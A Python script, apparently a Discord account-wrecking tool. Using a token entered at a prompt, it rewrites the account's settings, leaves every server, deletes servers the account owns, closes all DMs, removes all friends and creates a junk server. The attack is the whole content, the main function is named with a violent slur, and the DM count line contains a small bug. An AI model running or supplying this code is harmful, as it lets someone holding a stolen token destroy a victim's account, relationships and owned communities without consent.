LICNECE = """
Copyright © 2021 Drillenissen#4268
Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the “Software”), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:
The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.
THE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
"""

from colored import fg, attr
import requests

r = fg(241) # Setup color variables
r2 = fg(255)
b = fg(31)
w = fg(15)

def rape():
    headers = {
        'User-Agent' : 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7',
        'Authorization' : input(f"\n {r}[{w}?{r}] Token: ")
    }

    payload = {"theme" : "light","locale" : "ja","message_display_compact" : True,"inline_embed_media" : False,"gif_auto_play" : False,"render_embeds" : False,"render_reactions" : False,"animate_emoji" : False,"convert_emoticons" : False,"enable_tts_command" : False,"explicit_content_filter" : 0,"status" : "invisible"}

    print(f"\n {r}[{w}+{r}] Changeing settings")
    requests.patch(
        "https://canary.discordapp.com/api/v6/users/@me/settings",
        headers = headers,
        json = payload
    )
    print(f"\n {r}[{w}+{r}] Detecting servers")

    guilds = requests.get(
        "https://discord.com/api/v6/users/@me/guilds",
        headers = headers
    ).json()

    print(f" {r}[{w}!{r}] {len(guilds)} servers found\n")

    for i in guilds:
        try:
            print(f"  {r}[{w}!{r}] Leaving {i['name']} | Owner: {i['owner']}")
            if not i["owner"]:
                responce = requests.delete(
                    f"https://discord.com/api/users/@me/guilds/{i['id']}",
                    headers = headers
                )
            else:
                responce = requests.delete(
                    f"https://discord.com/api/guilds/{i['id']}",
                    headers = headers
                )
        except Exception as e:
            print(e)

    print(f"\n {r}[{w}+{r}] Detecting DM channels")

    dms = requests.get(
        "https://discord.com/api/v6/users/@me/channels",
        headers = headers
    ).json()
    print(f" {r}[{w}!{r}] {len(guilds) - 1} DM channels found\n")

    for i in dms:
        print(f"  {r}[{w}!{r}] Leaving DM channel with: {', '.join([x['username'] for x in i['recipients']])}")
        responce = requests.delete(
            f"https://discord.com/api/channels/{i['id']}",
            headers = headers
        )

    print(f"\n {r}[{w}+{r}] Detecting relationships")

    relations = requests.get(
    "https://discord.com/api/v8/users/@me/relationships",
    headers = headers
    ).json()

    relations = [i for i in relations if i["type"] != 0]

    print(f" {r}[{w}!{r}] {len(relations)} relationships found@n")

    for i in relations:
        print(f"  {r}[{w}!{r}] Removing {i['user']['username']} from relationships")
        responce = requests.put(
            f"https://discord.com/api/v8/users/@me/relationships/{i['user']['id']}",
            headers = headers,
            json = {"type":0}
        )

    guild = {
        "channels" : None,
        "icon" : None,
        "name" : "lol",
        "region" : "japan"
    }
    requests.post(
        'https://discordapp.com/api/v6/guilds',
        headers = headers,
        json = guild
    )
